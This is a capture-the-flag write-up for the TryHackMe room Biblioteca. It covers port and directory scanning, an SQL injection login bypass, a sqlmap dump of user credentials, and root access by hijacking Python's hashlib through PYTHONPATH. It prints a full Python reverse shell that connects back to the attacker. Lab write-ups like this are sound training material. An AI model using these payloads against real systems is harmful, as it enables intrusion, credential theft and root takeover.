# TryHackMe Biblioteca Write-up

Below is my write-up for the TryHackMe room [Biblioteca](https://tryhackme.com/room/biblioteca).

We start up the machine, and we can start with a Nmap scan.

`nmap -sC -sV <IP Address>`

![NmapScanBiblio](/THM/Images/Biblioteca/thmbiblionmap.jpg)

The results provide us with two open ports.

- SSH port 22
- HTTP port 8000

We find a login page on the landing. The first thing to do is find any other folders or pages we can access. For that, we can enumerate using `gobuster`.

![BiblioTHMLandin](/THM/Images/Biblioteca/thmbibliohttplanding.jpg)

These are the results from `gobuster` enumeration. The command used was.

`gobuster dir -u http://<IP ADDRESS> -w /usr/share/wordlists/dirb/common.txt`

![BiblioGobuster](/THM/Images/Biblioteca/thmbibliogobuster.jpg)

We can create a user. Once we log in, it just takes us to an index page with only a logout option.

If we try `1' or '1'='1';-- -` , we can see that the login form is vulnerable to SQL injection.

We can then use `sqlmap` to extract table data.

`sqlmap -u http://<IP ADDRESS>:8000/login --data='username=''&password=''' --current-user --dump`

Breaking down the command 

```bash 
-u http://<IP ADDRESS>:8000/login  # the flag refers to the target URL
--data= 'username=''&password=''' # Data string to be sent through POST (e.g. "id=1")
--current-user --dump # --current-user Retrieve DBMS current user --dump DUMP DMBS Database table entries.
```

`sqlmap` provides us with the following table.

![BiblioSQLMAPresults](/THM/Images/Biblioteca/thmbibliosqlmap.jpg)

We found the table with the users. We can now try the password found with the username to SSH into the machine. 

Excellent, we are in with the password found. We can see that the user has limited surface points to privilege escalation. Let's see what other users have to know if we can move sideways. We can see two others can have access. Let us focus on hazel. 

![BiblioSmokeyAccess](/THM/Images/Biblioteca/thmbibliosmokey.jpg)

We can either break the password by guessing or using a hydra attack on the ssh port now that we know the username and password.

Great, we now have our first flag. Let's look at what hazel can run. 

![BibliootheruserAccess](/THM/Images/Biblioteca/thmbiblioaccesstoroot.jpg)

Hazel can run a specific python file as `sudo` without requiring a password. If we look at the python file, we can see it is a script that takes the user's input and then provides a hash of the input in various formats. The part that interests us is that it calls for a specific library `hashlib`. So we can hijack the python library by making one on the local folder. However, we are unable to create files in our home directory.

So we will need to redirect the python path. In this instance, we will copy the  `hashlib.py` file in the `/tmp` folder. So we can modify it.

Since we are running it as `sudo`. We will add a reverse shell at the start of the file. 

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<YOUR IP>",<LISTENING PORT>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

If we set up a listener on our machine, we can then listen out for the reverse shell. We then can run the file by specifying the python path.

`sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py`

Great that gives us a reverse shell as root and we can find the last flag.

![Bibliotecaroot](/THM/Images/Biblioteca/thmlastflag.jpg)

Overall, it was a good machine to practice the basics. 